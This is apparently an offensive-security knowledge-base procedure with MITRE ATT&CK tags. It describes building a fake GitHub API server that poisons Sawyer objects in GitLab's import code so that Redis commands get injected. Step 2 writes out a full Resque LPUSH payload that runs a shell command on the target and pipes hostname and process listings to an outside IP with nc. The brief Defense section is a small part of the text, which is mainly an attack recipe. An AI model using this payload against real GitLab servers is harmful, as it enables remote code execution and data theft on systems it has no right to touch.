---
id: proc-prepare-dummy-server
name: Prepare-Dummy-GitHub-Server-with-Malicious-Payloads
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.398Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
tags:
  - payload
  - fake-server
  - sawyer-poisoning
platforms:
  - Linux
tools:
  - '[[tools/Node.js]]'
commands: []
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Prepare-Dummy-GitHub-Server-with-Malicious-Payloads

## Summary

This procedure configures a fake GitHub server by extracting provided files and embedding malicious payloads that poison Sawyer::Resource objects to inject Redis commands.

## Description

The dummy server mimics GitHub's API (/api/v3/repositories/{repo_id}) to return responses with nested hashes like {"to_s": {"bytesize": 2, "to_s": "1234REDIS_COMMANDS"}}, exploiting Sawyer's hash-to-object conversion in GitLab's parallel_scheduling.rb for cache key manipulation and Redis protocol injection (CRLF, $size via to_s/bytesize).

## Requirements

1. Access to rce.tar.gz attachment or equivalent files
2. Text editor for modifying redis_command.txt
3. Node.js environment

## Defense

Defensive measures and detection strategies:

- Validate API responses from external services like GitHub
- Sanitize cache keys in Redis interactions
- Monitor for anomalous outbound requests to unknown hosts

## Objectives

1. Embed RCE gadgets in response payloads
2. Prepare poisoned Sawyer objects for injection
3. Configure server to serve malicious repository data

## Instructions

### Step 1: Decompress Archive

**Context**: Extract the dummy server files to a working directory.

Run `tar -xzf rce.tar.gz -C /tmp/dummy-server`.

**Expected Output**: Files including index.js and redis_command.txt extracted.

### Step 2: Modify Payload File

**Context**: Edit redis_command.txt to include Redis commands like LPUSH for Resque RCE.

Add content such as `lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open('|(hostname; ps aux) | nc 51.75.74.52 11211 ').read\"],\"queue\":\"system_hook_push\"}"`.

**Expected Output**: File updated with malicious Redis protocol elements.

### Step 3: Verify Payload Structure

**Context**: Ensure nested hashes target Sawyer methods for injection.

Review JSON responses in server files for {"to_s": ...} structures.

**Expected Output**: Payloads correctly formatted for Sawyer poisoning.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Node.js]]

## Tags

- [[payload]]
- [[fake-server]]
- [[sawyer-poisoning]]
